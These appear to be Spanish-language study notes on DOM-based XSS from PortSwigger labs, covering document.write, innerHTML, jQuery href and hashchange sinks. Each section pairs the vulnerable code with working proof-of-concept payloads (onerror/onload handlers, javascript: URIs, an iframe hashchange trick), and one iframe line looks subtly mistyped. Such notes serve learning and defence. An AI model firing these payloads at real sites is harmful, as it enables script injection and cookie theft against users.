# DOM XSS

Tags: #XSS #PortSwigger #JavaScript #DOM 

* [DOM - Introduccion](https://lenguajejs.com/dom/introduccion/que-es/)

```bash 
En un DOM XSS, el HTML con la inyección no viene del servidor. Si no que se construye y se ejecuta en nuestro navegador a traves de JavaScript 
```

## DOM XSS  con 'document.write' y 'location.search'

```bash 
Este lab utiliza una función que escribe directamente en la página el valor obtenido desde la parte de búsqueda de la URL (lo que va después del símbolo de interrogación). Este dato no es validado ni codificado, y se inserta dinámicamente mediante una función que genera HTML de forma directa.
```

```javascript 
<script>
function trackSearch(query) {
     document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
     trackSearch(query);
}
</script>


<img src="/resources/images/tracker.gif?searchTerms=hola">
```

```javascript 
// En la inyección se debe cerrar la doble comilla y la etiqueta del código para poder ejecutar JavaScript y acontecer el XSS

	hola"> <svg/onload=alert(1)>
	hola"> <img src/onerror=alert(document.domain)>
```

## DOM XSS con 'innerHTML' y 'location.search'

```bash 
La aplicación vulnerable toma el valor introducido en la búsqueda (extraído directamente desde la URL) y lo inserta dentro del contenido de una etiqueta mediante una asignación directa sin aplicar ninguna medida de sanitización. Esto permite introducir fragmentos de código que se interpretan como HTML y que pueden incluir eventos maliciosos.
```

```javascript 
// InnerHTML permite alterar uno o varios elementos del DOM sin afectar el resto de la página

function doSearchQuery(query) {
     document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
     doSearchQuery(query);
}
```

```javascript 
// En la inyección se puede colocar lo siguiente:

	<img src="test.png">        // Cargar una imagen 
	<img src=0 onerror=alert(0)>
	<img src=0 onerror=alert(document.cookie)>    // Usar el error para cargar código JavaScript
```

## DOM XSS en 'href' con JQuery y 'location.search'  

```bash 
La aplicación vulnera al utilizar jQuery para localizar un enlace de navegación y modificar su destino utilizando directamente el valor de un parámetro en la URL. Al no realizarse ningún tipo de validación ni restricción sobre ese valor, es posible reemplazar el destino original con un esquema especial que ejecute código malicioso.

- href: Es un hipervinculo 
- a: Elemento anchor
```

```javascript 
// Se puede buscar los siguientes elementos cuando se tiene "JQuery library's $ selector function"
	$('a') -> <a>
	$('#id') -> id="id"
	$('.clase') -> class="clase"


// Lo que se coloque en 'name' lo coloca y le agrega un hipervinculo 
<a id="author" href="http://a.com">test</a>
```

```javascript
// En la inyección en 'href' se puede hacer que en lugar de que vaya a la url, esta ejecute una instrucción como alternativa (Es obsoleto)

	javascript:alert(document.cookie)    // Se coloca en la url de 'Submit feedback'
```

## DOM XSS con JQuery y evento 'hashchange'

```bash 
La aplicación utiliza jQuery para seleccionar elementos basándose en ese valor y realizar acciones como hacer scroll automático a un post específico. El problema es que se emplea directamente como selector, sin validación alguna, permitiendo al atacante manipularlo para inyectar y ejecutar código en el navegador de la víctima.
```

```bash 

```

```javascript 
// El selector de JQuery te crea temporalmente un elemento, esto funciona en la url del navegador 

	#<img src=0 onerror=alert(0)> 

// Se debe forzar un cambio a la solicitud, ya que de primera si funciona pero despues ya no ya que como cvarga el mismo contenido, la función no 'funciona' 
	#<img src=0 onerror=print()> 

// Utilizar el server que comparte el lab, utilizar 'iframe html' y forzar el cambio 
	<iframe src="http://web.com/#"></iframe>       // Forma original 

// Forma concatenada para cargar otro contenido y forzar el cambio 
	<iframe src="http://web.com/#" onload="this.source += '<img src=0 onerror=alert(0)>' "></iframe> 
	<iframe src="http://web.com/#" onload="this.source += '<img src=0 onerror=print()>' "></iframe>
```